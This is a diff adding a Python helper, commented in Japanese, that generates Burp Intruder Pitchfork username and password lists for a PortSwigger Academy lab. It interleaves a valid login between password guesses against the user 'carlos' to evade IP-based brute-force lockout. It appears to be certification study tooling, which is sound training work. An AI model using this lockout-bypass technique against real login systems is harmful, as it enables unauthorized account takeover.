@@ -1,0 +1,132 @@
+#!/usr/bin/env python3
+"""
+IPベースのbrute-force対策(連続N回失敗でブロック)を回避するための、
+Burp Intruder Pitchfork攻撃用ペイロードリストを生成する。
+
+PortSwigger Web Security Academyの定番構成(wiener:peterでログインし、
+carlosを攻撃対象とする)を前提にデフォルト値を設定している。
+
+一定間隔ごとに「自分の正しいログイン(wiener:peter)」を挟み込むことで、
+ブロックのトリガーとなる「連続失敗」を回避しながら、
+carlosへのパスワード総当たりを続けられるようにする。
+
+使い方(最小):
+    bruteforce-reset-payloads --wordlist authentication-lab-passwords.txt
+
+wordlistはBSCP_WORDLISTS_DIR(デフォルト: bscp/wordlists/)からファイル名で
+解決される。フルパスを渡した場合はそれをそのまま使う。
+
+出力先はBSCP_OUTPUT_DIR(デフォルト: /tmp/bscp/)配下の、
+スクリプト名のサブフォルダに生成される。
+
+使い方(カスタム):
+    bruteforce-reset-payloads \
+        --reset-username wiener --reset-password peter \
+        --target-username carlos --wordlist /path/to/passwords.txt \
+        --interval 2 --out-dir ./payloads
+
+出力:
+    <out-dir>/usernames.txt
+    <out-dir>/passwords.txt
+    (Burp IntruderのPayload position 1/2にそれぞれ読み込む)
+"""
+import argparse
+import os
+import sys
+
+SCRIPT_NAME = "bruteforce-reset-payloads"
+DEFAULT_OUTPUT_BASE = "/tmp/bscp"
+
+
+def resolve_wordlist_path(wordlist_arg):
+    """--wordlistがファイル名のみなら、BSCP_WORDLISTS_DIR配下を探す。
+    パス区切り(/)を含む場合はそのまま使う。"""
+    if os.sep in wordlist_arg or wordlist_arg.startswith("."):
+        return wordlist_arg
+    wordlists_dir = os.environ.get("BSCP_WORDLISTS_DIR")
+    if not wordlists_dir:
+        sys.exit(
+            "エラー: --wordlist にファイル名のみが指定されましたが、"
+            "環境変数 BSCP_WORDLISTS_DIR が設定されていません。\n"
+            "  export BSCP_WORDLISTS_DIR=/path/to/bscp/wordlists\n"
+            "のように設定するか、--wordlist にフルパスを指定してください。"
+        )
+    return os.path.join(wordlists_dir, wordlist_arg)
+
+
+def resolve_output_dir(out_dir_arg):
+    if out_dir_arg is not None:
+        return out_dir_arg
+    output_base = os.environ.get("BSCP_OUTPUT_DIR", DEFAULT_OUTPUT_BASE)
+    return os.path.join(output_base, SCRIPT_NAME)
+
+
+def main():
+    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
+    parser.add_argument("--reset-username", default="wiener", help="カウンターリセット用の自分のusername(デフォルト: wiener)")
+    parser.add_argument("--reset-password", default="peter", help="カウンターリセット用の自分のpassword(デフォルト: peter)")
+    parser.add_argument("--target-username", default="carlos", help="総当たり対象のusername(デフォルト: carlos)")
+    parser.add_argument("--wordlist", required=True,
+                         help="candidate passwordのファイル名、またはフルパス。"
+                              "ファイル名のみの場合はBSCP_WORDLISTS_DIR配下を探す。")
+    parser.add_argument("--interval", type=int, default=2,
+                         help="何回連続で対象への試行を送った後にリセットログインを挟むか(デフォルト: 2)")
+    parser.add_argument("--out-dir", default=None,
+                         help="出力先ディレクトリ(デフォルト: $BSCP_OUTPUT_DIR/bruteforce-reset-payloads/)")
+    args = parser.parse_args()
+
+    if args.interval < 1:
+        sys.exit("エラー: --interval は1以上を指定してください")
+
+    wordlist_path = resolve_wordlist_path(args.wordlist)
+    if not os.path.isfile(wordlist_path):
+        sys.exit(f"エラー: wordlistが見つかりません: {wordlist_path}")
+
+    with open(wordlist_path, encoding="utf-8") as f:
+        candidates = [line.rstrip("\n") for line in f if line.strip()]
+
+    if not candidates:
+        sys.exit("エラー: wordlistが空です")
+
+    out_dir = resolve_output_dir(args.out_dir)
+
+    # 実行前リマインド
+    print("=== bruteforce-reset-payloads ===")
+    print(f"リセット用ログイン: {args.reset_username}:{args.reset_password}")
+    print(f"攻撃対象          : {args.target_username}")
+    print(f"読み込むwordlist  : {wordlist_path} ({len(candidates)}件)")
+    print(f"動作              : {args.target_username}:候補を{args.interval}回試すごとに"
+          f" {args.reset_username}:{args.reset_password} を1回挟みます")
+    print(f"出力先            : {out_dir}")
+    print("===============================")
+    print()
+
+    usernames = []
+    passwords = []
+
+    for i, candidate in enumerate(candidates):
+        if i % args.interval == 0:
+            usernames.append(args.reset_username)
+            passwords.append(args.reset_password)
+        usernames.append(args.target_username)
+        passwords.append(candidate)
+
+    os.makedirs(out_dir, exist_ok=True)
+    username_path = os.path.join(out_dir, "usernames.txt")
+    password_path = os.path.join(out_dir, "passwords.txt")
+
+    with open(username_path, "w", encoding="utf-8") as f:
+        f.write("\n".join(usernames) + "\n")
+
+    with open(password_path, "w", encoding="utf-8") as f:
+        f.write("\n".join(passwords) + "\n")
+
+    print(f"生成完了: {len(usernames)}行")
+    print(f"  {username_path}")
+    print(f"  {password_path}")
+    print("Burp IntruderでPitchfork攻撃を作成し、各ファイルをPayload position 1/2に読み込んでください。")
+    print("Resource poolでMaximum concurrent requestsを1に設定することを忘れずに。")
+
+
+if __name__ == "__main__":
+    main()
